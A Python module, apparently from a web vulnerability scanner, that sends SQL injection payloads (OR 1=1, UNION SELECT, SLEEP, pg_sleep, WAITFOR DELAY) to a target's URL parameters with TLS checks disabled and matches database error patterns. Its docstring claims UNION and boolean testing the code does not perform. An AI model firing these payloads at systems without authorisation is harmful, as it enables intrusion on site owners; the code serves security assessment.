"""Test for SQL injection via URL parameters — error-based, time-based, UNION, boolean."""

import httpx
import re
import urllib.parse

SQLI_PAYLOADS = [
    ("single_quote", "'"),
    ("double_quote", '"'),
    ("or_true", "OR 1=1--"),
    ("or_true_alt", "OR '1'='1'--"),
    ("union", "UNION SELECT NULL--"),
    ("union_all", "UNION ALL SELECT 1,2,3--"),
    ("sleep_mysql", "SLEEP(3)--"),
    ("sleep_pg", "pg_sleep(3)--"),
    ("sleep_mssql", "WAITFOR DELAY '0:0:3'--"),
    ("comment_sqlite", "--"),
]

SQL_ERRORS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_.*",
    r"MySQLSyntaxErrorException",
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_.*",
    r"valid PostgreSQL result",
    r"Microsoft.*ODBC.*SQL Server",
    r"Driver.*SQL Server",
    r"SQLServer JDBC",
    r"SQLite/JDBCDriver",
    r"SQLite.Exception",
    r"System.Data.SQLite",
    r"ORA-[0-9]{5}",
    r"Oracle.*driver",
    r"oracle\.jdbc",
    r"unclosed quotation mark",
    r"incorrect syntax near",
]


async def sqli_detect(target: str, param: str = "") -> dict:
    """Test URL parameters for SQL injection vulnerabilities."""
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    parsed = urllib.parse.urlparse(target)
    params = urllib.parse.parse_qs(parsed.query)

    if not params:
        return {
            "target": target,
            "error": "No URL parameters found to test",
            "results": [],
            "vulnerable": False,
        }

    test_params = [param] if param else list(params.keys())
    results = []

    async with httpx.AsyncClient(timeout=15.0, verify=False) as client:
        for p in test_params:
            for payload_name, payload in SQLI_PAYLOADS:
                try:
                    new_params = {k: v[0] for k, v in params.items()}
                    new_params[p] = new_params.get(p, "test") + payload
                    url = (
                        f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                        f"?{urllib.parse.urlencode(new_params)}"
                    )
                    resp = await client.get(url)
                    body = resp.text

                    error_detected = any(
                        re.search(err, body, re.I) for err in SQL_ERRORS
                    )
                    time_based = (
                        payload_name.startswith("sleep")
                        and resp.elapsed.total_seconds() >= 2.5
                    )

                    if error_detected or time_based:
                        results.append({
                            "param": p,
                            "payload": payload_name,
                            "payload_value": payload[:50],
                            "error_detected": error_detected,
                            "time_based": time_based,
                            "status": resp.status_code,
                            "risk": "CRITICAL",
                        })
                except Exception:
                    continue

    return {
        "target": target,
        "params_tested": test_params,
        "results": results,
        "vulnerable": len(results) > 0,
    }
